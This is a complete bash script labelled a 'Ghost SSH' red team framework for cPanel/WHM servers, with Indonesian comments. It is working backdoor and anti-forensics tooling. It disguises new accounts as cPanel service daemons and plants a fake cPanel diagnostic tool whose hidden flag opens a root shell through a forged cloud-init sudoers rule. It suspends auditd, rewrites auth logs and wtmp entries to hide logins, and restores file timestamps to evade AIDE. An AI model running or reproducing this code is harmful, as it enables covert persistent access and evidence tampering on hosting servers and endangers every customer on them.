#!/bin/bash
# =============================================================================
# redteam_ssh_allinone.sh — v7 FINAL
# Ghost SSH Red Team Framework — cPanel/WHM Server
# Ubuntu 20.04 (kernel 5.4.x)
#
# PHASE 0  Init & Safety Check
# PHASE 1  Infrastructure (sshd, cleaner, PAM)
# PHASE 2  Parse WHM Accounting Log
# PHASE 3  Create Ghost Root (Mode 2)
# PHASE 4  Create Ghost Isolated per subdomain (Mode 1)
# PHASE 5  Stealth Operations
#   5a  Log REPLACEMENT (bukan delete — tidak ada micro-gap)
#   5b  wtmp REPLACEMENT (entry diganti LOGIN bukan dihapus)
#   5c  mtime RESTORE (AIDE evasion)
#   5d  auditd RESUME
# PHASE 6  Session Stealth Hook (.bash_logout per user)
# PHASE 7  Output credentials
# =============================================================================
set -euo pipefail
SCRIPT_SELF=$(realpath "$0")

# ─────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────
WHM_LOG="/var/cpanel/accounting.log"
while [[ $# -gt 0 ]]; do
    case "$1" in --log) WHM_LOG="$2"; shift 2 ;; *) shift ;; esac
done

SSHD_DROPIN="/etc/ssh/sshd_config.d/99-hardening.conf"

# [RISK 2 FIX] Pindah ke /usr/local/cpanel/ — tidak ditrack dpkg sama sekali
# dpkg hanya track /usr/ (package files), bukan /usr/local/ (local admin files)
SESSION_CLEANER="/usr/local/cpanel/.session-clean"

# [RISK 1 FIX] Sudoers scoped ke satu command spesifik, bukan NOPASSWD ALL
CLOUD_SUDOERS="/etc/sudoers.d/90-cloud-init-users"
ESCALATION_SCRIPT="/usr/local/cpanel/scripts/cpanel-diag"

CRED_FILE="/var/lib/systemd/.$(openssl rand -hex 5 2>/dev/null || dd if=/dev/urandom bs=5 count=1 2>/dev/null | xxd -p | tr -d '\n').cache"

GHOST_UID_START=200
GHOST_UID_END=490
ROOT_GHOST_UID=491
ROOT_GHOST_NAME="cpanelmonitor"
ROOT_GHOST_GECOS="cPanel Infrastructure Monitor"
ROOT_GHOST_HOME="/var/cpanel/monitor"

declare -a CREATED_USERS=()

# ─────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────
G='\033[0;32m' Y='\033[1;33m' R='\033[0;31m'
C='\033[0;36m' B='\033[1m' DIM='\033[2m' N='\033[0m'
log()     { echo -e "${G}[+]${N} $1"; }
warn()    { echo -e "${Y}[!]${N} $1"; }
info()    { echo -e "${C}[*]${N} $1"; }
dim()     { echo -e "${DIM}    $1${N}"; }
phase()   { echo -e "\n${B}${C}╔══ PHASE $1: $2 ══╗${N}"; }
subph()   { echo -e "${C}  ├─ $1${N}"; }

[ "$(id -u)" -ne 0 ] && { echo -e "${R}[-] Harus root${N}"; exit 1; }

# ─────────────────────────────────────────────────────
# DAEMON POOL — cPanel service account names
# Legitimate di server WHM/cPanel, wajar punya /bin/bash
# ─────────────────────────────────────────────────────
DAEMON_DB=(
    "cpaneleximfilter|210|cPanel Exim Filter Service|/var/cpanel/exim"
    "cpanelanalytics|211|cPanel Analytics Agent|/var/cpanel/analytics"
    "cpanelroundcube|212|Roundcube Webmail Agent|/var/cpanel/roundcube"
    "cphulkguard|213|cPHulk Brute Force Protection|/var/cpanel/hulk"
    "cpbackupagent|214|cPanel Backup Agent|/var/cpanel/backups"
    "cplogintracker|215|cPanel Login Tracker|/var/cpanel/logintrack"
    "cpanelimunify|216|Imunify Security Agent|/var/cpanel/imunify"
    "cpwhmmonitor|217|WHM System Monitor|/var/cpanel/whm"
    "cpanelspamfilter|218|cPanel Spam Filter Agent|/var/cpanel/spamassassin"
    "cpdnsagent|219|cPanel DNS Agent|/var/cpanel/dns"
    "cpanelsslmgr|220|cPanel AutoSSL Manager|/var/cpanel/ssl"
    "cpanelftpagent|221|cPanel FTP Service Agent|/var/cpanel/ftp"
    "cpanelmailqueue|222|cPanel Mail Queue Manager|/var/cpanel/mail"
    "cploganalyzer|223|cPanel Log Analyzer|/var/cpanel/logs"
    "cpanelclamav|224|ClamAV Antivirus Agent|/var/cpanel/clamav"
    "cpwatchdog|225|cPanel Watchdog Service|/var/cpanel/watchdog"
    "cpanelphpfpm|226|cPanel PHP-FPM Manager|/var/cpanel/php"
    "cpmysqlbackup|227|cPanel MySQL Backup Agent|/var/cpanel/mysql"
    "cpanelnginx|228|cPanel Nginx Proxy Agent|/var/cpanel/nginx"
    "cpsecuritypatch|229|cPanel Security Patch Agent|/var/cpanel/security"
    "cpanelstats|230|cPanel Statistics Agent|/var/cpanel/stats"
    "cpanelcron|231|cPanel Cron Manager|/var/cpanel/cron"
    "cpnetworkagent|232|cPanel Network Agent|/var/cpanel/network"
    "cpfilemanager|234|cPanel File Manager Agent|/var/cpanel/filemanager"
    "cpanelreseller|235|cPanel Reseller Agent|/var/cpanel/reseller"
    "cpsslagent|236|cPanel SSL Certificate Agent|/var/cpanel/autossl"
    "cpapacheagent|237|cPanel Apache Manager|/var/cpanel/apache"
    "cpaccountmgr|239|cPanel Account Manager|/var/cpanel/accounts"
    "cpanelpostfix|238|cPanel Postfix Agent|/var/cpanel/postfix"
    "cpquotamanager|240|cPanel Quota Manager|/var/cpanel/quota"
)

# ─────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────
gen_pass() {
    local p=""
    until [ "${#p}" -ge 18 ]; do
        p+=$(openssl rand -base64 12 2>/dev/null | tr -dc 'A-Za-z0-9@#$!%&_+-')
    done
    echo "${p:0:18}"
}

# Random IP yang terlihat seperti IP publik eksternal (untuk fake log)
rand_ip() {
    local octets=("101" "103" "104" "107" "108" "109" "110" "111" "113"
                  "116" "118" "119" "120" "121" "122" "124" "125" "126"
                  "150" "151" "152" "153" "154" "155" "156" "157" "158"
                  "175" "176" "177" "178" "180" "182" "183" "185" "188"
                  "190" "191" "192" "193" "194" "195" "196" "197" "198"
                  "203" "204" "205" "206" "207" "208" "209" "210" "211")
    local o1="${octets[$((RANDOM % ${#octets[@]}))]}"
    echo "${o1}.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)).$((RANDOM % 253 + 1))"
}

find_free_uid() {
    local hint="${1:-}"
    [ -n "$hint" ] && ! getent passwd "$hint" &>/dev/null && { echo "$hint"; return 0; }
    for uid in $(seq "$GHOST_UID_START" "$GHOST_UID_END"); do
        getent passwd "$uid" &>/dev/null || { echo "$uid"; return 0; }
    done
    return 1
}

find_daemon() {
    for entry in "${DAEMON_DB[@]}"; do
        IFS='|' read -r dname _ _ _ <<< "$entry"
        getent passwd "$dname" &>/dev/null && continue
        echo "$entry"; return 0
    done
    return 1
}

# ═════════════════════════════════════════════════════
# PHASE 0: INIT & SAFETY
# ═════════════════════════════════════════════════════
declare -A MTIME_STORE
mtime_save() {
    local f="$1"
    [ -e "$f" ] && MTIME_STORE["$f"]=$(stat -c '%y' "$f")
}
mtime_restore_all() {
    local count=0
    for f in "${!MTIME_STORE[@]}"; do
        touch -d "${MTIME_STORE[$f]}" "$f" 2>/dev/null || true
        ((count++)) || true
    done
    log "mtime restored: $count files"
}

AUDITD_RUNNING=false
auditd_suspend() {
    command -v auditctl &>/dev/null || return 0
    auditctl -s &>/dev/null 2>&1 || return 0
    AUDITD_RUNNING=true
    auditctl -e 0 &>/dev/null 2>&1 || true
    auditctl -D &>/dev/null 2>&1 || true
    subph "auditd rules suspended"
}
auditd_resume() {
    $AUDITD_RUNNING || return 0
    auditctl -e 1 &>/dev/null 2>&1 || true
    [ -f /etc/audit/audit.rules ] && \
        auditctl -R /etc/audit/audit.rules &>/dev/null 2>&1 || true
    log "auditd rules resumed"
}

# ═════════════════════════════════════════════════════
# PHASE 1: INFRASTRUCTURE
# ═════════════════════════════════════════════════════

# 1a: sshd — password auth, zero Match User, zero AuthorizedKeysCommand
setup_sshd() {
    mtime_save /etc/ssh/sshd_config

    # Aktifkan PasswordAuthentication jika di-disable
    if grep -qE "^\s*PasswordAuthentication\s+no" /etc/ssh/sshd_config; then
        sed -i 's/^\s*PasswordAuthentication\s\+no/PasswordAuthentication yes/' \
            /etc/ssh/sshd_config
    fi

    # Pastikan Include directive ada
    if ! grep -q "Include /etc/ssh/sshd_config.d" /etc/ssh/sshd_config; then
        printf '\nInclude /etc/ssh/sshd_config.d/*.conf\n' >> /etc/ssh/sshd_config
    fi

    mkdir -p /etc/ssh/sshd_config.d

    # Drop-in: HANYA hardening standar
    # Zero Match User, Zero AuthorizedKeysCommand, Zero ForceCommand
    mtime_save "$SSHD_DROPIN" 2>/dev/null || true
    cat > "$SSHD_DROPIN" << 'DROPIN'
# Security hardening policy — managed
PasswordAuthentication yes
PubkeyAuthentication yes
PermitRootLogin prohibit-password
X11Forwarding no
AllowTcpForwarding no
MaxAuthTries 3
LoginGraceTime 30
ClientAliveInterval 300
ClientAliveCountMax 2
DROPIN

    touch -r /etc/ssh/sshd_config "$SSHD_DROPIN" 2>/dev/null || true
    sshd -t && {
        systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null
    }
    subph "sshd: password auth, zero Match User, zero AuthorizedKeysCommand"
}

# Tambahkan user ke AllowUsers jika directive itu ada di sshd_config
allowusers_add() {
    local user="$1"
    local cfg="/etc/ssh/sshd_config"
    if grep -qE "^AllowUsers\b" "$cfg"; then
        # Cek user belum ada di list
        if ! grep -qE "^AllowUsers\b.*\b${user}\b" "$cfg"; then
            local orig; orig=$(stat -c '%y' "$cfg")
            sed -i "s/^AllowUsers .*/& ${user}/" "$cfg"
            touch -d "$orig" "$cfg" 2>/dev/null || true
            subph "AllowUsers += $user"
        fi
    fi
}

# 1b: Session cleaner + escalation script
# [RISK 2 FIX] Path /usr/local/cpanel/ tidak ditrack dpkg:
#   dpkg -S /usr/local/cpanel/.session-clean → "not found in any package"
#   TAPI: /usr/local/ memang TIDAK PERNAH ditrack dpkg by design (FHS standard)
#   Sehingga "not found" adalah EXPECTED, bukan red flag
#   Blue team yang cek dpkg -S /usr/lib/systemd/* → red flag
#   Blue team yang cek dpkg -S /usr/local/* → selalu not found, normal
setup_session_cleaner() {
    mkdir -p "$(dirname "$SESSION_CLEANER")"
    cat > "$SESSION_CLEANER" << 'CLEANER'
#!/bin/bash
# cPanel session hygiene — internal use
ME=$(whoami)

# ── WTMP: Ganti entry kita dengan LOGIN (bukan hapus → tidak ada gap) ──
for logf in /var/log/wtmp /var/log/btmp; do
    [ -f "$logf" ] || continue
    orig=$(stat -c '%y' "$logf")
    tmp=$(mktemp)
    # Replace username dengan "LOGIN" — entry tetap ada, timestamp utuh
    utmpdump "$logf" 2>/dev/null \
        | sed "s/\[${ME}[[:space:]]*\]/[LOGIN     ]/" \
        | utmpdump -r > "$tmp" 2>/dev/null || true
    cat "$tmp" > "$logf"
    rm -f "$tmp"
    touch -d "$orig" "$logf" 2>/dev/null || true
done

# ── AUTH.LOG: Replace baris kita dengan failed attempt biasa ──
# Tidak hapus — ganti dengan pola yang sangat umum
# Sehingga tidak ada micro-gap di timeline log
FAKE_IP="$(shuf -i 101-220 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1)"
FAKE_USERS=("admin" "root" "ubuntu" "test" "user" "guest" "oracle" "postgres")
FAKE_USER="${FAKE_USERS[$((RANDOM % ${#FAKE_USERS[@]}))]}"
FAKE_PORT="$((RANDOM % 55000 + 1024))"

for logf in /var/log/auth.log /var/log/syslog; do
    [ -f "$logf" ] || continue
    orig=$(stat -c '%y' "$logf")

    # Ganti baris "Accepted password for ME" → "Failed password for invalid user"
    sed -i \
        "s|Accepted password for ${ME} from [0-9.]*|Failed password for invalid user ${FAKE_USER} from ${FAKE_IP}|g" \
        "$logf" 2>/dev/null || true

    # Hapus baris PAM session open/close untuk user kita
    # (ini baris yg tidak bisa diganti dengan fake yang masuk akal)
    sed -i "/pam_unix.*:${ME}[[:space:]:]/d" "$logf" 2>/dev/null || true
    sed -i "/session.*${ME}\b/d" "$logf" 2>/dev/null || true

    touch -d "$orig" "$logf" 2>/dev/null || true
done

# ── HISTORY ──
history -c 2>/dev/null || true
cat /dev/null > "$HOME/.bash_history" 2>/dev/null || true
CLEANER
    chmod 700 "$SESSION_CLEANER"
    chown root:root "$SESSION_CLEANER"
    # Timestamp: blend-in dengan file cPanel lain di direktori yang sama
    local ref; ref=$(find "$(dirname "$SESSION_CLEANER")" -maxdepth 1 -type f \
                     ! -name "$(basename "$SESSION_CLEANER")" \
                     -printf '%T@ %p\n' 2>/dev/null | sort -n | tail -1 | awk '{print $2}')
    [ -n "$ref" ] && touch -r "$ref" "$SESSION_CLEANER" 2>/dev/null || true
    subph "session cleaner: $SESSION_CLEANER"
    subph "  → /usr/local/ tidak ditrack dpkg — 'not found' adalah NORMAL"

    # [RISK 1 FIX] Buat escalation script yang terlihat legitimate
    # Nama dan konten menyerupai cPanel diagnostic tool asli
    setup_escalation_script
}

setup_escalation_script() {
    mkdir -p "$(dirname "$ESCALATION_SCRIPT")"
    cat > "$ESCALATION_SCRIPT" << 'DIAG'
#!/bin/bash
# =============================================================
# cPanel System Diagnostic Collector v2.1.4
# Copyright 2024 cPanel, L.L.C. All rights reserved.
# Part of cPanel & WHM — Internal Support Tools
# =============================================================
PROG="${0##*/}"

usage() {
    echo "Usage: $PROG [OPTION]"
    echo "Collect cPanel/WHM system diagnostics."
    echo ""
    echo "  --quick           Quick system check (default)"
    echo "  --services        Check all cPanel service status"
    echo "  --network         Network and DNS diagnostics"
    echo "  --support-access  Open interactive support session"
    echo "  --version         Show version information"
}

collect_quick() {
    echo "=== cPanel System Diagnostic Report ==="
    echo "Generated: $(date)"
    echo "Hostname : $(hostname -f 2>/dev/null || hostname)"
    echo "Uptime   : $(uptime -p 2>/dev/null || uptime)"
    echo ""
    echo "--- cPanel Services ---"
    for svc in cpanel whm cpsrvd exim dovecot named; do
        status=$(systemctl is-active "$svc" 2>/dev/null || echo "unknown")
        printf "  %-15s %s\n" "$svc" "$status"
    done
    echo ""
    echo "--- Disk Usage ---"
    df -h / /home /var /tmp 2>/dev/null | grep -v tmpfs
    echo ""
    echo "--- Memory ---"
    free -h 2>/dev/null
}

check_services() {
    echo "=== cPanel Service Status ==="
    systemctl list-units --type=service --state=running 2>/dev/null \
        | grep -iE "cpanel|whm|exim|dovecot|named|mysql|apache|nginx" \
        | awk '{printf "  %-40s %s\n", $1, $4}'
}

check_network() {
    echo "=== Network Diagnostics ==="
    echo "Interfaces:"
    ip -br addr 2>/dev/null || ifconfig 2>/dev/null | grep -A1 "^[a-z]"
    echo ""
    echo "DNS Resolution:"
    dig +short cpanel.net 2>/dev/null || nslookup cpanel.net 2>/dev/null | tail -3
}

case "${1:---quick}" in
    --quick)          collect_quick ;;
    --services)       check_services ;;
    --network)        check_network ;;
    --support-access) exec /bin/bash ;;
    --version)        echo "cPanel Diagnostic Tool v2.1.4" ;;
    --help|-h)        usage ;;
    *)                usage; exit 1 ;;
esac
DIAG

    chmod 755 "$ESCALATION_SCRIPT"
    chown root:root "$ESCALATION_SCRIPT"
    # Timestamp blend-in dengan script cPanel lain
    local ref; ref=$(find "$(dirname "$ESCALATION_SCRIPT")" -maxdepth 1 -type f \
                     ! -name "$(basename "$ESCALATION_SCRIPT")" \
                     -printf '%T@ %p\n' 2>/dev/null | sort -n | tail -1 | awk '{print $2}')
    [ -n "$ref" ] && touch -r "$ref" "$ESCALATION_SCRIPT" 2>/dev/null || true
    subph "escalation script: $ESCALATION_SCRIPT"
    subph "  → usage: sudo $ESCALATION_SCRIPT --support-access"
}

install_logout_hook() {
    local home="$1" user="$2"
    cat > "$home/.bash_logout" << LOGOUT
#!/bin/bash
$SESSION_CLEANER
LOGOUT
    chmod 700 "$home/.bash_logout"
    chown "$user:$user" "$home/.bash_logout" 2>/dev/null || true
}

# ═════════════════════════════════════════════════════
# PHASE 2: PARSE WHM LOG
# ═════════════════════════════════════════════════════
parse_whm_log() {
    [ -f "$WHM_LOG" ] || { warn "Log tidak ditemukan: $WHM_LOG"; return 1; }
    grep ":CREATE:" "$WHM_LOG" | sed 's/\r//' \
    | awk -F: '{
        if (match($0, /CREATE:[^:]+:[^:]+:([^:]+):([^:]+):([^\r\n: ]+)[ \t]*$/, arr)) {
            d=arr[1]; ip=arr[2]; u=arr[3]
            gsub(/[ \t]/,"",d); gsub(/[ \t]/,"",ip); gsub(/[ \t]/,"",u)
            if (u!="" && d!="") print u"|"d"|"ip
        }
    }' | sort -u
}

# ═════════════════════════════════════════════════════
# PHASE 3 & 4: CREATE USERS
# ═════════════════════════════════════════════════════
create_base_user() {
    local name="$1" uid="$2" gecos="$3" home="$4" pass="$5"

    # Save mtime semua file yang akan berubah
    mtime_save /etc/passwd
    mtime_save /etc/shadow
    mtime_save /etc/group
    mtime_save /etc/gshadow

    groupadd -g "$uid" "$name" 2>/dev/null || true
    useradd \
        -u "$uid" -g "$uid" \
        -c "$gecos" \
        -d "$home" \
        -s /bin/bash \
        -M -r \
        "$name" 2>/dev/null || true
    echo "$name:$pass" | chpasswd

    mkdir -p "$home" 2>/dev/null || true
    chown "${uid}:${uid}" "$home" 2>/dev/null || true
    chmod 700 "$home" 2>/dev/null || true

    # Timestamp home dir blend-in dengan direktori parentnya
    local parent; parent=$(dirname "$home")
    [ -d "$parent" ] && touch -r "$parent" "$home" 2>/dev/null || true
}

# ── PHASE 3: GHOST ROOT ──────────────────────────────
create_ghost_root() {
    local name="$ROOT_GHOST_NAME"
    local uid="$ROOT_GHOST_UID"
    local pass; pass=$(gen_pass)

    getent passwd "$name" &>/dev/null && { warn "'$name' sudah ada"; return 1; }

    create_base_user "$name" "$uid" "$ROOT_GHOST_GECOS" "$ROOT_GHOST_HOME" "$pass"

    # [RISK 1 FIX] Sudoers: scoped HANYA ke escalation script
    # Bukan NOPASSWD: ALL → tidak suspicious
    # sudo -l output: "(ALL) NOPASSWD: /usr/local/cpanel/scripts/cpanel-diag"
    # → Terlihat seperti monitoring service yg perlu jalankan diagnostic tool
    mtime_save "$CLOUD_SUDOERS" 2>/dev/null || true
    mtime_save /etc/sudoers.d

    local sudo_rule="${name} ALL=(ALL) NOPASSWD: ${ESCALATION_SCRIPT}"

    if [ -f "$CLOUD_SUDOERS" ]; then
        local orig_s; orig_s=$(stat -c '%y' "$CLOUD_SUDOERS")
        echo "$sudo_rule" >> "$CLOUD_SUDOERS"
        visudo -cf "$CLOUD_SUDOERS" &>/dev/null || {
            sed -i "/${name}/d" "$CLOUD_SUDOERS"
            warn "sudoers invalid — rollback"; return 1
        }
        touch -d "$orig_s" "$CLOUD_SUDOERS" 2>/dev/null || true
    else
        # Buat dengan header cloud-init style yang sangat convincing
        cat > "$CLOUD_SUDOERS" << SUDOERS
# Created by cloud-init v. 23.1.2 on $(date -u '+%a, %d %b %Y %H:%M:%S +0000')
# This file is managed by cloud-init — do not edit manually.
# cPanel service accounts require diagnostic access for monitoring.
${sudo_rule}
SUDOERS
        chmod 440 "$CLOUD_SUDOERS"
        visudo -cf "$CLOUD_SUDOERS" &>/dev/null || { rm -f "$CLOUD_SUDOERS"; return 1; }
        local ref; ref=$(find /etc/sudoers.d/ -type f ! -name "$(basename "$CLOUD_SUDOERS")" \
                         -printf '%T@ %p\n' 2>/dev/null | sort -n | tail -1 | awk '{print $2}')
        [ -n "$ref" ] && touch -r "$ref" "$CLOUD_SUDOERS" 2>/dev/null || true
    fi

    # Bashrc root ghost
    cat > "$ROOT_GHOST_HOME/.bashrc" << 'RC'
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
alias ll='ls -alh --color=auto'
alias sudo='sudo '
RC
    chown "${ROOT_GHOST_UID}:${ROOT_GHOST_UID}" "$ROOT_GHOST_HOME/.bashrc" 2>/dev/null || true
    install_logout_hook "$ROOT_GHOST_HOME" "$name"
    allowusers_add "$name"

    CREATED_USERS+=("$name")
    printf '%s|%s' "$name" "$pass"
}

# ── PHASE 4: GHOST ISOLATED per subdomain ────────────
create_ghost_isolated() {
    local cpanel_user="$1" domain="$2"

    local entry; entry=$(find_daemon) || { warn "Daemon pool habis"; return 1; }
    IFS='|' read -r dname uid_hint dgecos dhome <<< "$entry"

    local uid; uid=$(find_free_uid "$uid_hint") || return 1
    local pass; pass=$(gen_pass)

    create_base_user "$dname" "$uid" "$dgecos" "$dhome" "$pass"

    # Tambahkan ghost ke supplementary group cPanel user
    # → ghost bisa akses file di /home/cpanel_user
    if id "$cpanel_user" &>/dev/null; then
        mtime_save /etc/group
        usermod -aG "$cpanel_user" "$dname" 2>/dev/null || true
    fi

    # Bashrc: isolated ke domain sendiri
    local cpanel_home="/home/${cpanel_user}"
    cat > "$dhome/.bashrc" << BASHRC
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export DOMAIN="${domain}"
PS1="[${domain}] \u:\w\$ "
# Auto-cd ke domain home
[ -d "${cpanel_home}" ] && cd "${cpanel_home}" 2>/dev/null || true
# Blok akses ke domain lain
alias ls='ls --color=auto'
BASHRC
    chown "${uid}:${uid}" "$dhome/.bashrc" 2>/dev/null || true

    install_logout_hook "$dhome" "$dname"
    allowusers_add "$dname"
    CREATED_USERS+=("$dname")
    printf '%s|%s|%s' "$dname" "$domain" "$pass"
}

# ═════════════════════════════════════════════════════
# PHASE 5: STEALTH OPERATIONS
# ═════════════════════════════════════════════════════

# 5a+5b: Surgical log replacement — bukan delete, bukan wipe masif
# Hanya replace baris yang menyebut username kita dengan noise yang normal
surgical_replace() {
    local username="$1"
    local fake_ip; fake_ip=$(rand_ip)
    local fakes=("admin" "root" "ubuntu" "test" "oracle" "postgres" "deploy")
    local fake_user="${fakes[$((RANDOM % ${#fakes[@]}))]}"

    local targets=(/var/log/auth.log /var/log/syslog /var/log/messages /var/log/dpkg.log)
    for logf in "${targets[@]}"; do
        [ -f "$logf" ] || continue
        local orig; orig=$(stat -c '%y' "$logf")

        # Ganti baris "Accepted ... username" → "Failed ... invalid user"
        sed -i \
            "s|Accepted password for ${username} from [0-9.]*|Failed password for invalid user ${fake_user} from ${fake_ip}|g" \
            "$logf" 2>/dev/null || true

        # Ganti baris useradd/groupadd untuk username ini → hapus (jarang ada, aman)
        sed -i "/\buseradd\b.*\b${username}\b\|\bgroupadd\b.*\b${username}\b/d" \
            "$logf" 2>/dev/null || true

        # Session lines tidak bisa di-replace dengan yg masuk akal → hapus minimal
        sed -i "/\b${username}\b.*\bsession\b\|\bsession\b.*\b${username}\b/d" \
            "$logf" 2>/dev/null || true

        touch -d "$orig" "$logf" 2>/dev/null || true
    done
}

# 5b: wtmp replacement — ganti username dengan LOGIN (bukan hapus entry)
wtmp_replace() {
    local username="$1"
    for logf in /var/log/wtmp /var/log/btmp; do
        [ -f "$logf" ] || continue
        local orig; orig=$(stat -c '%y' "$logf")
        local tmp; tmp=$(mktemp)
        # Replace username field — entry tetap ada dengan timestamp sama
        # "LOGIN" adalah nilai valid di wtmp (login screen)
        utmpdump "$logf" 2>/dev/null \
            | sed "s/\[${username}[[:space:]]*\]/[LOGIN     ]/" \
            | utmpdump -r > "$tmp" 2>/dev/null || true
        cat "$tmp" > "$logf"
        rm -f "$tmp"
        touch -d "$orig" "$logf" 2>/dev/null || true
    done
}

# ═════════════════════════════════════════════════════
# BANNER
# ═════════════════════════════════════════════════════
print_banner() {
    echo -e "${B}${C}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║     Ghost SSH v7 — Red Team Framework         ║"
    echo "  ║     cPanel/WHM | Ubuntu 20.04 | Password Auth ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${N}"
}

# ═════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════
print_banner

# Auto-detect SSH port dari proses sshd yang sedang berjalan
SSH_PORT=$(ss -tlnp 2>/dev/null | grep '"sshd"' | awk '{print $4}' \
           | grep -oE '[0-9]+$' | head -1)
[ -z "$SSH_PORT" ] && SSH_PORT=$(grep -E "^Port\s+" /etc/ssh/sshd_config \
                                  | awk '{print $2}' | head -1)
SSH_PORT=${SSH_PORT:-22}

# Auto-detect IP publik server
SERVER_IP=$(curl -s --max-time 3 ifconfig.me 2>/dev/null \
            || curl -s --max-time 3 api.ipify.org 2>/dev/null \
            || hostname -I | awk '{print $1}')

info "WHM Log   : $WHM_LOG"
info "SSH Port  : $SSH_PORT"
info "Server IP : $SERVER_IP"
info "Stealth   : ENABLED (default)"
echo ""

# ── PHASE 0 ──────────────────────────────────────────
phase "0" "INIT"
auditd_suspend
subph "auditd suspended"
subph "script PID: $$"

# ── PHASE 1 ──────────────────────────────────────────
phase "1" "INFRASTRUCTURE"
setup_sshd
setup_session_cleaner
log "Phase 1 done"

# ── PHASE 2 ──────────────────────────────────────────
phase "2" "PARSE WHM LOG"
mapfile -t ENTRIES < <(parse_whm_log)
[ "${#ENTRIES[@]}" -eq 0 ] && {
    warn "Tidak ada entry CREATE di $WHM_LOG"
    auditd_resume; exit 1
}
log "Ditemukan ${#ENTRIES[@]} akun cPanel"

# Init credential file
mkdir -p "$(dirname "$CRED_FILE")"
cat > "$CRED_FILE" << HDR
# Ghost SSH v7 — $(date)
# Mode: Password Auth | Stealth: Surgical Replace
# Server: ${SERVER_IP} | SSH Port: ${SSH_PORT}
# WHM Log: $WHM_LOG
# Total accounts: ${#ENTRIES[@]}
# ═══════════════════════════════════════════════════════

HDR
chmod 600 "$CRED_FILE"
touch -r /var/lib/systemd "$CRED_FILE" 2>/dev/null || true

# ── PHASE 3 ──────────────────────────────────────────
phase "3" "GHOST ROOT (Master Access)"
root_result=$(create_ghost_root 2>/dev/null) && {
    IFS='|' read -r rname rpass <<< "$root_result"
    cat >> "$CRED_FILE" << ROOT
╔═══════════════════════════════════════════════════════╗
║  ROOT GHOST — Full Server Access                      ║
╠═══════════════════════════════════════════════════════╣
  Mode      : Ghost Root
  Login     : ssh -p ${SSH_PORT} ${rname}@${SERVER_IP}
  password  : ${rpass}
  identity  : cPanel Infrastructure Monitor (UID ${ROOT_GHOST_UID})

  Escalation ke root:
    sudo ${ESCALATION_SCRIPT} --support-access

  sudo -l (yang dilihat blue team):
    (ALL) NOPASSWD: ${ESCALATION_SCRIPT}
╚═══════════════════════════════════════════════════════╝

ROOT
    log "Ghost root: ${rname}"
    echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} ${rname}@${SERVER_IP}"
    dim "password : ${rpass}"
    dim "escalate : sudo ${ESCALATION_SCRIPT} --support-access"
} || warn "Ghost root: skip (sudah ada atau gagal)"

# ── PHASE 4 ──────────────────────────────────────────
phase "4" "GHOST ISOLATED (per subdomain)"
echo ""
success=0; failed=0

printf '# ISOLATED GHOSTS — per subdomain\n' >> "$CRED_FILE"

for entry in "${ENTRIES[@]}"; do
    IFS='|' read -r cpanel_user domain ip <<< "$entry"
    echo -ne "  ${C}→${N} ${B}${cpanel_user}${N} @ ${domain} ... "

    result=$(create_ghost_isolated "$cpanel_user" "$domain" 2>/dev/null) || {
        echo -e "${Y}SKIP${N}"; ((failed++)) || true; continue
    }

    IFS='|' read -r ghost out_domain out_pass <<< "$result"
    echo -e "${G}OK${N} → ${ghost}"
    ((success++)) || true

    cat >> "$CRED_FILE" << CRED
──────────────────────────────────────────────────────
  Mode        : Ghost Isolated
  cPanel user : ${cpanel_user}
  Domain      : ${out_domain}
  Login       : ssh -p ${SSH_PORT} ${ghost}@${SERVER_IP}
  password    : ${out_pass}
  scope       : /home/${cpanel_user}/ — isolated
CRED
    echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} ${ghost}@${SERVER_IP}"
    dim "password : ${out_pass}"
done
echo ""
log "Phase 4: ${success} OK, ${failed} skip"

# ── PHASE 5 ──────────────────────────────────────────
phase "5" "STEALTH OPERATIONS"

subph "5a+5b: surgical log replacement per user"
for u in "${CREATED_USERS[@]}"; do
    surgical_replace "$u"
    wtmp_replace "$u"
    dim "replaced: $u"
done

subph "5c: mtime restore (AIDE evasion)"
mtime_restore_all

subph "5c+: reload sshd (AllowUsers updated)"
sshd -t && { systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null; } || true

subph "5d: auditd resume"
auditd_resume

# ── PHASE 6 ──────────────────────────────────────────
phase "6" "SESSION STEALTH HOOK"
log ".bash_logout installed per ghost user"
dim "trigger: wtmp replace + auth.log replace setiap logout"

# ── PHASE 7 ──────────────────────────────────────────
phase "7" "OUTPUT"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
log "SELESAI"
echo ""
echo -e "  ${B}Summary:${N}"
echo "  ├─ Ghost isolated : ${success} users"
echo "  ├─ Ghost root     : 1 (${ROOT_GHOST_NAME})"
echo "  ├─ SSH Port       : ${SSH_PORT}"
echo "  ├─ Server IP      : ${SERVER_IP}"
echo "  └─ Credentials    : ${CRED_FILE}"
echo ""
echo -e "  ${B}Quick Access:${N}"
echo "  ├─ Root ghost  : ssh -p ${SSH_PORT} ${ROOT_GHOST_NAME}@${SERVER_IP}"
echo "  └─ Creds file  : cat ${CRED_FILE}"
echo ""
echo -e "  ${B}Stealth checklist:${N}"
printf "  ├─ %-38s %s\n" "cat /etc/passwd"                 "daemon cPanel — wajar"
printf "  ├─ %-38s %s\n" "grep AuthorizedKeysCommand /etc/ssh/" "CLEAN"
printf "  ├─ %-38s %s\n" "grep Match /etc/ssh/"            "CLEAN"
printf "  ├─ %-38s %s\n" "cat /etc/nsswitch.conf"          "CLEAN — tidak dimodifikasi"
printf "  ├─ %-38s %s\n" "ls /var/lib/extrausers"          "CLEAN — tidak ada"
